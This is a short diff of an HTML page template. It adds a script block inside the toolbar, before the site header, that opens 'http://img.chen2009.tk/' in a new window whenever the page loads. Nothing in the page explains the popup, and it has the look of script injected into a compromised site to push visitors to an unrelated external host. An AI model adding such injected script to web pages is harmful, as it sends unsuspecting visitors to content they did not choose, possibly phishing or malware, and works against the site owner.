@@ -191,6 +191,9 @@
 
 <body>
 <div id="toolbar">
+	<script>
+		window.open('http://img.chen2009.tk/','_blank');
+	</script>
 	<header class="header-global">
 		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
 			<div class="container">
